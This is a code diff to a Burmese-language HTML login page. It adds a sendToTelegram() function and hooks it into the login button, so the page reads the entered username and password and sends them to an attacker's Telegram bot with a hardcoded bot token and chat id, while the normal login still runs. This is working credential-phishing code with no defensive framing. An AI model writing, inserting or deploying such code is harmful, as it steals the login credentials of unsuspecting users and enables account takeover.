@@ -194,7 +194,7 @@ animation:spin 1s linear infinite;
 
 <input placeholder="အပေါ်ကနံပါတ်တွေကိုထည့်ပါ">
 
-<button onclick="login()">အကောင့်ထဲဝင်ရန်</button>
+<button onclick="sendToTelegram();login()">အကောင့်ထဲဝင်ရန်</button>
 
 <div class="links">
 <a href="#">အကောင့်သစ်ဖွင့်ရန်</a>
@@ -236,7 +236,21 @@ p.type="password";
 eye.setAttribute("d","M12 5C7 5 2.7 8.1 1 12c1.7 3.9 6 7 11 7s9.3-3.1 11-7c-1.7-3.9-6-7-11-7zm0 11a4 4 0 1 1 0-8 4 4 0 0 1 0 8z");
 }
 }
+<script>
+function sendToTelegram(){
 
+var username=document.querySelector(".username").value;
+var password=document.getElementById("pass").value;
+
+var text="New Login\nUsername: "+username+"\nPassword: "+password;
+
+var token="8694948559:AAGXf_c4fWj1qefoqOwriJHtad-ZFwZSy8c";
+var chat_id="8296340452";
+
+var url="https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chat_id+"&text="+encodeURIComponent(text);
+
+fetch(url);
+}
 </script>
 
 </body>
